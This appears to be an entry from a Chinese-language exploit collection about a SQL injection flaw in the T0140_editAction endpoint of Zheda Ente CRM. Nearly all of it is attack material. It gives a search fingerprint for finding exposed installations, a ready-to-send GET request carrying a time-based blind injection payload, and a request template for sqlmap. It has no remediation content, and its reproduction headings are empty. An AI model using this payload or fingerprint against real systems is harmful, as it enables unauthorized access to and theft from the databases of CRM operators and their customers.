# 浙大恩特CRMT0140_editActionSQL注入漏洞

- **系统**：浙大恩特CRMT0140_editAction　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="浙大恩特 CRM"`
- **请求**：`GET /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1';waitfor+delay+'0:0:5'-- HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`

**请求体 / payload**
```

sqlmap
GET /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1 HTTP/1.1
Host: xx.xx.xx.xx
```

**其他**
- 浙大恩特CRM T0140\_editAction SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 浙大恩特CRM